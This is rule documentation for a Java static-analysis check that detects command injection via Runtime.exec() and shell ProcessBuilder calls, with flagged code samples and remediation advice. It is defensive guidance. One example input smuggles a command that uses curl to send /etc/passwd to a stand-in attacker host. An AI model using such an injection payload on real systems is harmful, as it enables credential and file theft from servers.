---
title: "VNX-JAVA-001 – Command Injection via Runtime.exec()"
description: "Reports Runtime.exec() commands and shell ProcessBuilder scripts built at run time from concatenation, String.format or request values, directly or through a variable assigned a few lines above."
---

## Overview

This rule detects calls to `Runtime.getRuntime().exec()` where the command string is built using the `+` operator, indicating that user-supplied data may be concatenated directly into the command. When the concatenated value is attacker-controlled, the result is OS command injection (CWE-78): the attacker can inject additional shell commands that the JVM executes with the privileges of the running process.

**Severity:** High | **CWE:** [CWE-78 – Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

Command injection is consistently ranked in the OWASP Top 10 because it grants an attacker the same capabilities as a direct shell session. On a typical Java application server running as a service account, a successful injection can read application secrets, exfiltrate database credentials, install a reverse shell, or pivot to other internal systems.

The single-string form of `Runtime.exec()` passes the command to the operating system's default shell (`/bin/sh -c` on Unix), which parses metacharacters such as `;`, `|`, `&&`, `$()`, and backticks as command separators. An input like `../../etc/passwd; curl http://attacker.com/$(cat /etc/passwd | base64)` turns a benign-looking file lookup into a data exfiltration channel.

Unlike SQL injection, command injection has no parameterized equivalent in the single-string API — the only safe path is to move to an API that never invokes a shell.

## What Gets Flagged

The rule reports `Runtime.getRuntime().exec()` (or a variable assigned from `Runtime.getRuntime()`) whose command is concatenated or formatted with a non-constant value, reads a request value, or is a variable assigned that way within the 40 lines above. It also reports a `ProcessBuilder` or `pb.command()` that runs a shell (`sh -c`, `bash -c`, `cmd /c`, `powershell -Command`), inline or through a list built with `add("-c")`, whose script is built the same way.

```java
// FLAGGED: concatenation into the command
Process p = Runtime.getRuntime().exec("ping -c 1 " + host);

// FLAGGED: two-line form
String cmd = "nslookup " + req.getParameter("name");
Runtime.getRuntime().exec(cmd);

// FLAGGED: a shell parses the built script
new ProcessBuilder("sh", "-c", "grep " + pattern + " /var/log/app.log");
```

Not flagged: a constant command, concatenation of literals and `UPPER_CASE` constants only, an argument list that does not invoke a shell (`new ProcessBuilder("convert", input, output)`), a command that arrives as a plain method parameter of a wrapper, comments and string literals.

## Remediation

1. **Switch to `ProcessBuilder` with a split argument list.** When you supply each argument as a separate element of a `List<String>`, Java never passes the command through a shell — metacharacters in user input are treated as literal data, not shell syntax.

   ```java
   // SAFE: ProcessBuilder with explicit argument list — no shell involved
   String filename = request.getParameter("file");

   // Validate first: only allow safe characters
   if (!filename.matches("[a-zA-Z0-9._-]+")) {
       throw new IllegalArgumentException("Invalid filename");
   }

   ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.png");
   pb.redirectErrorStream(true);
   Process process = pb.start();
   ```

2. **Validate input before use.** Apply an allowlist (not a denylist) to any value that will appear in a command. A regular expression like `[a-zA-Z0-9._-]+` covers most filename and hostname use cases. Reject anything that does not match.

3. **Drop OS commands in favour of Java APIs.** For most common tasks — file conversion, compression, image processing — there are pure-Java libraries (`Apache Commons Imaging`, `Thumbnailator`, `Apache Commons Compress`) that never spawn a child process. Prefer them whenever feasible.

4. **Run the JVM process with minimal OS privileges.** Use a dedicated service account with only the permissions the application genuinely needs. Apply Linux seccomp or Java Security Manager policies where available to restrict what child processes can do.

5. **Log and alert on anomalous arguments.** Even with validation, log all computed command strings before execution. Structured logging makes it easier to detect injection attempts in a SIEM.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Java Security Cheat Sheet – OS Command Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [Java ProcessBuilder documentation](https://docs.oracle.com/en/java/docs/api/java.base/java/lang/ProcessBuilder.html)
- [OWASP ASVS V5 – Validation, Sanitization and Encoding](https://owasp.org/www-project-application-security-verification-standard/)
